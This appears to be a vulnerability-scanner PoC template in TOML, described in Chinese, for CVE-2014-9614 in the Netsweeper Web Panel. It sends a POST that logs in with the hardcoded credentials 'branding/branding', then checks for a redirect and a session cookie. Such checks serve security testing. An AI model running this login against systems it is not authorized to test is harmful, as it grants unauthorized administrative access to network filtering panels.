[info]
author = "AVE"
description = "通过向 /webadmin/auth/verification.php 发送 POST 请求，使用硬编码凭证 branding/branding 登录 Netsweeper Web Panel，验证是否存在默认弱口令漏洞"
id = "POC-AVE-2014-0051"
name = "Netsweeper Web Panel 硬编码凭证漏洞 PoC"
severity = "critical"
tags = [
    "cve-2014-9614",
    "netsweeper",
    "default-login",
]
vuln_id = [
    "CVE-2014-9614",
    "AVE-2014-0051",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/webadmin/auth/verification.php"
protocol = "http"

[poc.requests.body]
content = "login=branding&password=branding&Submit=Login"
type = "raw"

[poc.requests.headers]
Origin = "{{BaseURL}}"
Referer = "{{BaseURL}}/webadmin/start/"

[[poc.requests.matchers]]
expect = true
status = [302]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = [
    "Location: ../common/",
    "Location: ../start/",
]

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["Set-Cookie: webadminU="]
